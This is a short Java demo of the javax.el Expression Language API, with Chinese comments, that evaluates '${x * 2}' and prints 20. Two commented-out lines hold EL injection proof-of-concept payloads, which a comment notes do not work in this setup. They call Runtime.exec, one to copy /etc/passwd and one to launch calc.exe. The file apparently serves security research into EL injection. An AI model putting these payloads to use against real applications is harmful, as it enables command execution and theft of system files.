package el.demo;

import javax.el.*;

public class ELExample {

    public static void main(String[] args) {
        // 创建一个 ExpressionFactory 实例，它是创建表达式的主要入口
        ExpressionFactory factory = ExpressionFactory.newInstance();

        // 创建一个 StandardELContext 实例，它是表达式求值的上下文
        StandardELContext context = new StandardELContext(factory);

        // 设置在表达式中可用的变量
        context.getVariableMapper().setVariable("x", factory.createValueExpression(10, int.class));

        // 创建一个 ValueExpression 实例，它表示一个表达式，该表达式在求值时将返回一个值
        ValueExpression expr = factory.createValueExpression(context, "${x * 2}", int.class);

        // 下面的poc都不生效 https://xz.aliyun.com/t/7692
        // ValueExpression expr = factory.createValueExpression(context, "${''.getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"java.lang.Runtime.getRuntime().exec('cp /etc/passwd /tmp/1')\")}", int.class);
        // ValueExpression expr = factory.createValueExpression(context, "${pageContext.setAttribute(\"a\",\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"exec\",\"\".getClass()).invoke(\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null),\"calc.exe\"))}\n", int.class);

        // 求值表达式并打印结果
        int result = (int) expr.getValue(context);
        System.out.println(result);  // 输出：20
    }
}